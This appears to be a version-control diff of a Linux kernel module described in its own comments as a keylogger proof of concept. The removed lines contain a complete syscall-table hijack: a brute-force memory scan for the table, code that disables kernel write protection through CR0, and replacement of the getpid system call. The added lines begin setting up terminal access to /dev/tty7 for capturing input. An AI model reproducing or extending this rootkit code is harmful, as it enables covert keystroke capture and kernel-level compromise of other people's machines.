@@ -4,6 +4,9 @@
 #include <linux/errno.h> // not too sure about this
 #include <linux/unistd.h> // we're messing with syscalls
 #include <linux/syscalls.h> // same as above
+#include <linux/tty.h>
+#include <linux/fs.h>
+#include "headers/kfile.h" // file operations
 
 // this file, as it stands, is just a proof of concept. It doesn't
 // keylog anything, it just hijacks the getpid syscall.
@@ -15,6 +18,7 @@
 // a module license is required for most modules to run
 MODULE_LICENSE("GPL");
 
+// lets us make system calls within kernel
 // this will point to the syscall_table
 unsigned long *syscall_table;
 
@@ -30,46 +34,15 @@ asmlinkage long new_getpid(void) {
 }
 
 static int init(void) {
+  // our structs
+  struct tty_struct* my_tty = NULL;
+  struct file* my_file = NULL;
+  char* dev_name = "/dev/tty7";
 
-  // find the syscall table address through a brute force
-  unsigned long i = START_MEM;
-  while(i < END_MEM){
-    // we will compare the current address with that of sys_close
-    unsigned long *current_address = (unsigned long*)i;
-    if(current_address[__NR_close] == sys_close){
-      printk(KERN_ALERT "sys call table address is %lu\n",
-	     (unsigned long)current_address);
-      syscall_table = current_address;
-      break;
-    }
-    i+= sizeof(void*);
-  }
-  // debugging purposes
-  printk(KERN_ALERT "module initted\n");
-
-  // change wp bit to 0
-  write_cr0 (read_cr0 () & (~0x10000));
-
-  // store the original getpid and replace it with ours
-  original_getpid = (void *)syscall_table[__NR_getpid];
-  syscall_table[__NR_getpid] = new_getpid;
-
-  // restore the wp bit
-  write_cr0 (read_cr0 () | 0x10000);
-  
   return 0;
 }
 	 
 static void exit(void) {
-  // change wp bit to 0
-  write_cr0 (read_cr0 () & (~0x10000));
-
-  // restore the original getpid function
-  syscall_table[__NR_getpid] = original_getpid;
-
-  // restore the wp bit
-  write_cr0 (read_cr0 () | 0x10000);
-  printk(KERN_ALERT "module exitted\n");
 }
 
 // sets our custom functions as the init and exit functions
